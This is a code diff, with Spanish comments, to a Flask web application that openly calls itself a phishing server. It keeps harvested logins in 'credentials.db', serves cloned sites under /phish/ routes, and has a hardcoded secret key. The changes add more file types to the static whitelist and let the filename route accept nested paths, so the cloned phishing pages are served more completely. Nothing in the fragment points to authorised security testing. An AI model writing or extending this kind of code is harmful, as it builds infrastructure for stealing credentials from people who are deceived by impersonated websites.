@@ -18,7 +18,7 @@ app.secret_key = 'phishing_server_secret_key_2024'
 SITES_DIR = 'sites'
 LOGOS_DIR = 'logos'
 CREDENTIALS_DB = 'credentials.db'
-STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot']
+STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot', 'json', 'xml', 'txt', 'html']
 deployed_sites = {}  # Diccionario para trackear sitios "desplegados"
 
 # Lock para thread safety
@@ -306,7 +306,7 @@ def serve_phishing_site_root(site_name):
     else:
         return f"Sitio {site_name} activo - Archivos: {', '.join(site_info['files'])}"
 
-@app.route('/phish/<site_name>/<filename>')
+@app.route('/phish/<site_name>/<path:filename>')
 def serve_phishing_site(site_name, filename='index.php'):
     """Sirve el sitio de phishing como si fuera independiente"""
     site_info = get_site_info(site_name)
